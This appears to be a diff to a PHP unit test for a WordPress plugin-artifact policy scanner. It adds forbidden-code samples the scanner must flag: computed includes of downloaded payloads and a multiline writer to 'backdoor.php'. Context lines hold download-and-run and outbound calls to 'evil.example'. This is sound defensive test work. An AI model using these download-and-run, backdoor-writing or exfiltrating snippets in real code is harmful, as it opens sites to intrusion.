@@ -644,6 +644,8 @@ final class WporgArtifactPolicyTest extends TestCase {
 			'process pipe' => array( "proc_open( 'id', array(), \$pipes );", 'forbidden execution primitive' ),
 			'dynamic include' => array( 'include $downloaded_file;', 'forbidden execution primitive' ),
 			'comment-split include' => array( 'include/* split */ $downloaded_file;', 'forbidden execution primitive' ),
+			'computed multiline include' => array( "include (\n\tABSPATH .\n\t\$downloaded_file .\n\t'/payload.php'\n);", 'forbidden execution primitive' ),
+			'computed function-return include' => array( 'include get_downloaded_payload_path();', 'forbidden execution primitive' ),
 			'download and run' => array( "include download_url( 'https://evil.example/payload.php' );", 'forbidden execution primitive' ),
 			'plugin package install' => array( 'new Plugin_Upgrader();', 'forbidden package operation' ),
 			'plugin package update' => array( 'wp_update_plugins();', 'forbidden package operation' ),
@@ -653,6 +655,7 @@ final class WporgArtifactPolicyTest extends TestCase {
 			'arbitrary CSS writer' => array( "file_put_contents( WP_CONTENT_DIR . '/custom.css', \$payload );", 'forbidden arbitrary code writer' ),
 			'indirect PHP writer' => array( "\$target = ABSPATH . '/backdoor.php';\nfile_put_contents( \$target, \$payload );", 'forbidden arbitrary code writer' ),
 			'indirect CSS writer' => array( "\$target = WP_CONTENT_DIR . '/custom.css';\nfile_put_contents( \$target, \$payload );", 'forbidden arbitrary code writer' ),
+			'multiline PHP writer' => array( "file_put_contents(\n\tABSPATH .\n\t'/backdoor.php',\n\t\$payload\n);", 'forbidden arbitrary code writer' ),
 			'arbitrary file handle' => array( "fopen( ABSPATH . '/policy-probe.php', 'w' );", 'forbidden arbitrary code writer' ),
 			'raw curl' => array( "curl_init( 'https://evil.example' );", 'forbidden outbound primitive' ),
 			'raw socket' => array( "fsockopen( 'evil.example', 443 );", 'forbidden outbound primitive' ),
@@ -673,6 +676,8 @@ final class WporgArtifactPolicyTest extends TestCase {
 			'remote import' => array( "@import url('https://evil.example/theme.css');\n" ),
 			'unquoted remote URL' => array( "body { background: url(https://evil.example/pixel.png); }\n" ),
 			'protocol-relative userinfo URL' => array( "body { background: url('//mumega.com@evil.example/pixel.png'); }\n" ),
+			'IPv4 authority' => array( "body { background: url('http://127.0.0.1/pixel.png'); }\n" ),
+			'bracketed IPv6 authority' => array( "body { background: url('//[2001:db8::1]/pixel.png'); }\n" ),
 		);
 	}
 
